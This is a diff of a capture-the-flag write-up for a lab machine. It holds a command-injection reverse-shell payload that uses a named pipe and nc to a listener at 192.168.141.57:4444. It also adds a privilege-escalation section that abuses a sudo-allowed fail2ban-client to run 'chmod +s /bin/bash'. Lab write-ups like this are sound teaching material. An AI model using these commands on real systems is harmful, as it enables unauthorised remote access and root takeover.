@@ -66,7 +66,7 @@ Assuming we wanted to spawn a reverse shell, we would do something like;
 
 The `;` tells PHP to execute the next command immediately.
 
-### Payload 
+### Payload
 
 To spawn a reverse shell I used this playload:
 
@@ -94,13 +94,9 @@ The rest is the value where:
 
 `|nc 192.168.141.57 4444` >/tmp/f; - connects to your listener and redirects the content of your listener to the named pipe
 
-`file `- this is added because the code expects a filename, so that .txt can be added. Without this, the payload generates an error and is not executed. 
-
-
+`file`- this is added because the code expects a filename, so that .txt can be added. Without this, the payload generates an error and is not executed. 
 
 **TLDR:** The command creates a named pipe and starts a bash shell, redirects errors to your listener, connects to your listener and redirects your STDIN to /tmp/f so that instead of your commands being printed on the victim's screen, it is shoved to /tmp/f and gets executed by the bash shell.
-
-
 
 This is what the payload looks like when passed to exec()
 
@@ -125,3 +121,59 @@ Sending the request spawned a shell on my listener.
 Retrieve the user flag.
 
 ![user flag](/assets/img/uploads/billing-user flag.png "user flag")
+
+## Privilege Escalation
+
+To escalate to root I started by checking whether there were any commands that could be run as sudo.
+
+```
+sudo -l
+```
+
+![sudo list](/assets/img/uploads/billing-sudo list.png "sudo list")
+
+The fail2ban-client can be run as sudo. 
+
+After doing some research on this program, I learnt that it is an Intrusion Prevention System. It can perform an action based on set rules. Example, block a user after three unsuccessful attempts. Since the command is executed as root, then any action it performs has elevated rights. 
+
+I started by looking for any jails(security policy + action) that were present.
+
+![fail2ban jail](/assets/img/uploads/billing-fail2ban jail status.png "fail2ban jail")
+
+The `sshd` jail monitors ssh logins. 
+
+We will add a policy to sshd that checks whether there has been three unsuccesful login attempts and if true, an action` chmod +s /bin/bash` is executed. This will set an suid bit for bash andwe can then open it without being the root user.
+
+Set the security policy to perform an action after 3 failed ssh login attempts.
+
+```
+sudo /usr/bin/fail2ban-client set sshd maxretry 3
+```
+
+Check the existing actions. This is where the actions to be performed are placed.
+
+```
+sudo /usr/bin/fail2ban-client get sshd actions
+```
+
+Replace whatever is in the action with `chmod +s /bin/bash`
+
+```
+sudo /usr/bin/fail2ban-client set sshd action iptables-multiport actionban "chmod +s /bin/bash"
+```
+
+![set fail2ban action](/assets/img/uploads/billing-set fail2ban action.png "set fail2ban action")
+
+Attempt to log in with the wrong password 3 times.
+
+Check whether the suid bit has been set. The `s` in permissions indicates this has been achieved.
+
+![check suid bit](/assets/img/uploads/billing-check suid bit.png "check suid bit")
+
+Start bash in privileged mode.
+
+![root shell](/assets/img/uploads/billing-root shell.png "root shell")
+
+Find the root flag.
+
+![root flag](/assets/img/uploads/billing-root flag.png "root flag")
